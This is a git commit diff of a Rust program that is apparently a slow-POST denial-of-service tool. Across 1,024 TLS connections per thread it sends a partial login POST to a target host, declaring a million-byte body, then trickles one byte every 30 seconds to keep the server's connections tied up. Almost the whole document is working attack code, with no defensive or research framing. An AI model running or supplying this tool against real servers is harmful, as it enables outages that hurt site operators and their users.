f3e2f61f3923e52969eaed9c8089d2acdfbacdb5
Andrey Voronkov <voronkovaa@gmail.com>
2017-05-16 00:58:19 +0300

    Viable. But we need a brand new approach.

--- src/main.rs
+++ src/main.rs
@@ -1,7 +1,7 @@
 extern crate native_tls;
 use native_tls::TlsConnector;
 use std::env;
-use std::io::{Read, Write};
+use std::io::Write;
 use std::net::TcpStream;
 use std::thread;
 use std::time::Duration;
@@ -9,13 +9,19 @@ use std::time::Duration;
 fn main() {
     let host = env::var("HOST").unwrap();
     let port = "443";
-    let threads_count = 32;
-    let connections_count = 32;
+    let threads_count = 3;
+    let connections_count = 1024;
+
+    //let connections_producer = thread::spawn(move || {
+
+    //});
 
     let mut threads = Vec::with_capacity(threads_count);
+    let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\nemail=", host);
     for thread_number in 0..threads_count {
-        let host = host.clone();
-        let connections_count = connections_count.clone();
+        let host = host.to_owned();
+        let connections_count = connections_count.to_owned();
+        let start = start.to_owned();
         let thread = thread::spawn( move || {
             let mut streams = Vec::with_capacity(connections_count);
             let mut progresses = Vec::with_capacity(connections_count);
@@ -24,19 +30,19 @@ fn main() {
                 let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
                 let mut stream = connector.connect(&host, stream).unwrap();
                 let mut progress = String::new();
-                let start = "GET /";
                 progress.push_str(&start);
-                stream.write(start.as_bytes());
+                let _  = stream.write(start.as_bytes());
                 streams.push(stream);
                 progresses.push(progress);
+                println!("[Thread: {}][Thread Connection: {}][Written: {}]", thread_number, connection_number, progresses[connection_number]);
             }
 
             loop {
                 thread::sleep(Duration::from_secs(30));
                 let symbol = "a";
                 for connection_number in 0..connections_count {
-                    streams[connection_number].write(symbol.as_bytes());
-                    streams[connection_number].flush();
+                    let _ = streams[connection_number].write(symbol.as_bytes());
+                    let _ = streams[connection_number].flush();
                     progresses[connection_number].push_str(&symbol);
                     println!("[Thread: {}][Thread Connection: {}][Written: {}]", thread_number, connection_number, progresses[connection_number]);
                 }
